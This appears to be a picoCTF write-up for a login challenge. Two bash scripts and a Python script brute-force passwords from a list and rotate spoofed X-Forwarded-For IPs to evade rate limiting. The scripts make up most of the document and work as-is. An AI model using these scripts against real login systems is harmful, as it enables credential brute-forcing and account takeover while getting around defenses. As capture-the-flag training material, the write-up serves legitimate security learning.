The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: **ctf-player@picoctf.org** and uncover the hidden secret.

Additional details will be available after launching your challenge instance.

Hints:
- What IP does the server think you’re coming from?
- Read more about [X-forwarded-For](https://www.typeerror.org/docs/http/headers/x-forwarded-for)
- You can rotate fake IPs to bypass rate limits.

http://amiable-citadel.picoctf.net:54244/

## Solucion

### Forma 1 con bash

```
#!/bin/bash

# A counter to generate unique fake IPs
IP_COUNTER=0

# Loop through each password in the provided file
for password in $(cat passwords.txt); do
  # Increment the counter for each attempt
  let IP_COUNTER=IP_COUNTER+1
  
  echo "Attempting with password '$password' from fake IP '1.2.3.${IP_COUNTER}'"
  
  # Send the curl request with the current password and a unique X-Forwarded-For header.
  # The '-s' flag silences the progress bar for cleaner output.
  curl -s http://amiable-citadel.picoctf.net:54244/login \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 1.2.3.${IP_COUNTER}" \
    -d "{\"email\": \"ctf-player@picoctf.org\", \"password\": \"$password\"}"
done | grep "success\":true" # Filter the output to show only the successful login response
```

```
#!/bin/bash

# A counter to generate unique fake IPs
IP_COUNTER=0

# Loop through each password in the provided file
for password in $(cat passwords.txt); do
  # Increment the counter for each attempt
  let IP_COUNTER=IP_COUNTER+1
  
  echo "Attempting with password '$password' from fake IP '1.2.3.${IP_COUNTER}'"
  
  # Send the curl request by concatenating single and double-quoted strings
  curl -s http://amiable-citadel.picoctf.net:54244/login \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 1.2.3.${IP_COUNTER}" \
    -d '{"email": "ctf-player@picoctf.org", "password": "'"$password"'"}'

done | grep "success\":true"
```

## version python

```python
import requests

URL = "http://amiable-citadel.picoctf.net:52906/login"
EMAIL = "ctf-player@picoctf.org"
PASSWORD_FILE = "passwords.txt" # Asegúrate de que este archivo esté en el mismo directorio

ip_counter = 0

print("Iniciando el ataque de fuerza bruta con rotación de IP...")

try:
    # Abrimos el archivo de contraseñas de forma segura
    with open(PASSWORD_FILE, 'r') as f:
        for password in f:
            password = password.strip()
            
            ip_counter += 1
            fake_ip = f"10.10.10.{ip_counter}"
            
            headers = {
                'X-Forwarded-For': fake_ip
            }
            
            payload = {
                'email': EMAIL,
                'password': password
            }
            
            print(f"[*] Intentando con la contraseña: '{password}' desde la IP: {fake_ip}")

            try:
                response = requests.post(URL, headers=headers, json=payload)
                
                if response.json().get('success'):
                    print("\n" + "="*40)
                    print("[+] ¡Éxito! Contraseña encontrada.")
                    print(f"[+] Contraseña: {password}")
                    print(f"[+] Respuesta del servidor: {response.text}")
                    print("="*40)
                    break # Terminamos el bucle al encontrar la contraseña
            
            except requests.exceptions.RequestException as e:
                print(f"[!] Error de conexión: {e}")
                break
except FileNotFoundError:
    print(f"\n[!] Error: No se encontró el archivo '{PASSWORD_FILE}'.")
except Exception as e:
    print(f"\n[!] Ocurrió un error inesperado: {e}")

```

```

```